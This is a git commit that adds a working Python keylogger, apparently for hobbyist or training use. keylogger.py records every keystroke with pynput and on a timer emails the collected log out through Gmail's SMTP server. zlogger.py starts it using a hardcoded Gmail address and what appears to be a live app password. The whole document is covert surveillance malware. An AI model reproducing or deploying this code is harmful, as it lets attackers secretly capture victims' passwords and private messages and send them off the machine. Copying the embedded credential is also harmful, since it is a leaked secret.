3e131bca070ba41938cfd81686b9222514edb569
Leandro Manjate <titomanjate@gmail.com>
2023-08-25 12:14:38 +0100

    Keylogger that send every stroke to a email

---
+++ keylogger.py
@@ -0,0 +1,51 @@
+import pynput.keyboard
+import threading
+import smtplib
+
+
+class Keylogger:
+    def __init__(self,time_interval,email,password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email= email
+        self.password= password
+        print("We are in constructor method")
+
+    def append_to_log(self,string):
+        self.log= self.log + string   
+
+    def process_key_press(self,key):
+        
+        try:
+            # Tenta tratar a tecla como uma tecla alfanumérica
+            current_key = str(key.char)
+        except AttributeError:
+            # Trata teclas especiais
+            if key == pynput.keyboard.Key.space:
+                current_key = " "
+            else:
+               current_key = " "+str(key)+" "
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.send_mail(self.email,self.password,"\n\n"+self.log)
+        self.log=""
+        timer= threading.Timer(self.interval,self.report)
+        timer.start()
+    
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+    
+    
---
+++ zlogger.py
@@ -0,0 +1,4 @@
+import keylogger
+
+my_keylogger = keylogger.Keylogger(120,"titomanjate@gmail.com","yywriznvcklsaepi")
+my_keylogger.start()
